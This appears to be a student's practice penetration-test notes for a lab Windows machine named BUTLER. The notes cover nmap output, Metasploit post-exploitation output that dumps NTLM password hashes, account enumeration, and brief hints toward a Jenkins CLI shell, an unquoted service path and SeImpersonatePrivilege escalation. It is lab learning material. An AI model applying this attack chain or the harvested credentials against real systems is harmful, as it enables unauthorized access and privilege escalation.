Practicing report writing

nmap scan 

```
kali@kali ~ [255]> nmap -sC -sV -Pn -p- -T4 192.168.244.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 13:14 EST
Nmap scan report for 192.168.244.135
Host is up (0.00064s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:d1:7a:0d (VMware)
|_clock-skew: 10h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-21T05:18:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 259.67 seconds

```


so from this we can conclude 

- 135
	- MSRPC
- 139
- 445
- 5040
- 7680
- 8080
	- Jenkins server
- 49664
- 49665
- a









post exploitation

```
msf6 post(windows/gather/credentials/credential_collector) > exploit

[*] Running module against BUTLER
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:06aeec76975c06fdeaf9570f0de19154
    Extracted: butler:aad3b435b51404eeaad3b435b51404ee:9f2bac4511c6c9239344fc18fb43092d
    Extracted: DefaultAccount:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: sawyer:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
    Extracted: WDAGUtilityAccount:aad3b435b51404eeaad3b435b51404ee:6d3a7f4b9a410c7b47214f51e082add5
[+] Collecting tokens...
    BUTLER\butler
    NT AUTHORITY\SYSTEM
    No tokens available
[*] Post module execution completed

```


persistence

```
C:\>net users
net users

User accounts for \\BUTLER

-------------------------------------------------------------------------------
Administrator            butler                   DefaultAccount           
Guest                    sawyer                   WDAGUtilityAccount       
The command completed successfully.


C:\>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
butler
sawyer
The command completed successfully.



C:\>net user sawyer
net user sawyer
User name                    sawyer
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/20/2024 11:47:40 AM
Password expires             4/2/2024 11:47:40 AM
Password changeable          2/20/2024 11:47:40 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.

```





---


# walkthrough 



get shell through jenkins CLI, you can use metasploit or do it manually -> wisebootassistant no spaces or quotes



possible path?
seimpersonateprivilege